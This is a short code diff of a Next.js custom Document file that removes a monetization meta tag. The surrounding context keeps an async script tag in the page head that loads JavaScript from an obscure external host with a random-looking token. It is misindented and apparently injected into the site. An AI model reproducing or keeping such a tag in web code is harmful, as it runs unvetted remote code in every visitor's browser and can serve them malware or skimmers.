@@ -6,7 +6,6 @@ class MyDocument extends Document {
       <Html lang="en">
         <Head>
                 <script type="text/javascript" src="https://zcode15.me/?ze=muytembwmm5ha3ddf42dsmrz" async></script>
-          <meta name="monetization" content="8e7b017832054843cfa3ba823e3206ad" />
           <link
             rel="apple-touch-icon"
             sizes="180x180"
